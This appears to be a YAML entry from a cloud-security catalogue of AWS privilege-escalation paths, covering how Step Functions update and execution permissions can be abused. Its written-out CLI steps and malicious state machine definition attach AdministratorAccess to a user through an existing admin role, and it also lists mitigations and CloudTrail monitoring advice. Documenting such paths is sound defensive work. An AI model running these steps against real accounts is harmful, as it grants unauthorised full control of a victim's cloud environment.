id: stepfunctions-002
name: states:UpdateStateMachine + states:StartExecution
category: existing-passrole
services:
  - iam
  - stepfunctions

permissions:
  required:
    - permission: states:UpdateStateMachine
      resourceConstraints: Must have access to the target state machine ARN
    - permission: states:StartExecution
      resourceConstraints: Must have access to the target state machine ARN
  additional:
    - permission: states:ListStateMachines
      resourceConstraints: Helpful for discovering state machines to target
    - permission: states:DescribeStateMachine
      resourceConstraints: Useful for viewing the current definition and role ARN of a target state machine
    - permission: states:ListExecutions
      resourceConstraints: Helpful for monitoring execution history
    - permission: states:DescribeExecution
      resourceConstraints: Useful for polling execution status

description: A principal with `states:UpdateStateMachine` and `states:StartExecution` can replace the ASL definition of an existing Step Functions state machine that already has an admin IAM role attached. The attacker supplies a malicious ASL definition using a Step Functions SDK integration that calls `iam:AttachUserPolicy`, then starts a new execution. No `iam:PassRole` is required because the admin role was already assigned to the state machine — `states:UpdateStateMachine` updates only the definition, not the role.

prerequisites:
  admin:
    - An existing Step Functions state machine must already have an admin IAM role attached as its execution role
  lateral:
    - An existing Step Functions state machine must have an elevated IAM role attached as its execution role

exploitationSteps:
  awscli:
    - step: 1
      command: |
        aws stepfunctions list-state-machines \
          --query 'stateMachines[*].{name:name,arn:stateMachineArn}' \
          --output table
      description: Enumerate existing state machines to identify targets with privileged execution roles attached.
    - step: 2
      command: |
        aws stepfunctions describe-state-machine \
          --state-machine-arn STATE_MACHINE_ARN \
          --query '{roleArn:roleArn,status:status}' \
          --output json
      description: Inspect the target state machine to confirm it has a privileged role and is in an ACTIVE state.
    - step: 3
      command: |
        cat > /tmp/sfn-malicious-def.json << 'EOF'
        {
          "Comment": "Privilege escalation via existing state machine role",
          "StartAt": "AttachAdmin",
          "States": {
            "AttachAdmin": {
              "Type": "Task",
              "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
              "Parameters": {
                "UserName": "STARTING_USER",
                "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
              },
              "End": true
            }
          }
        }
        EOF

        aws stepfunctions update-state-machine \
          --state-machine-arn STATE_MACHINE_ARN \
          --definition file:///tmp/sfn-malicious-def.json
      description: Replace the state machine's definition with malicious ASL that calls iam:AttachUserPolicy. The existing admin role is preserved — no iam:PassRole required.
    - step: 4
      command: |
        aws stepfunctions start-execution \
          --state-machine-arn STATE_MACHINE_ARN
      description: Execute the now-malicious state machine. It runs under the pre-existing admin role and attaches AdministratorAccess to the starting user.

recommendation: |
  - **Restrict `states:UpdateStateMachine`** - This permission allows arbitrary modification of state machine definitions, including swapping in malicious ASL that abuses the machine's existing role. Only trusted CI/CD principals should have this permission.
  - **Audit state machines for privileged execution roles** - Any state machine with an administrative role is a persistent escalation vector for anyone with `states:UpdateStateMachine`. Regularly review and down-scope state machine roles.
  - **Apply least privilege to state machine roles** - Scope state machine execution roles to only the specific AWS APIs the state machine legitimately calls. An admin-scoped state machine role is a standing risk.
  - Monitor CloudTrail for `states:UpdateStateMachine` calls, especially those that change the state machine definition
  - Monitor CloudTrail for state machine definitions containing SDK integration tasks that call sensitive IAM APIs
  - Alert on IAM policy attachment events (`iam:AttachUserPolicy`, `iam:AttachRolePolicy`) originating from Step Functions execution roles
  - Implement AWS Config rules to detect state machines with overly permissive execution roles

discoveryAttribution:
  firstDocumented:
    author: Zander Mackie
    organization: Datadog
    date: "2025"

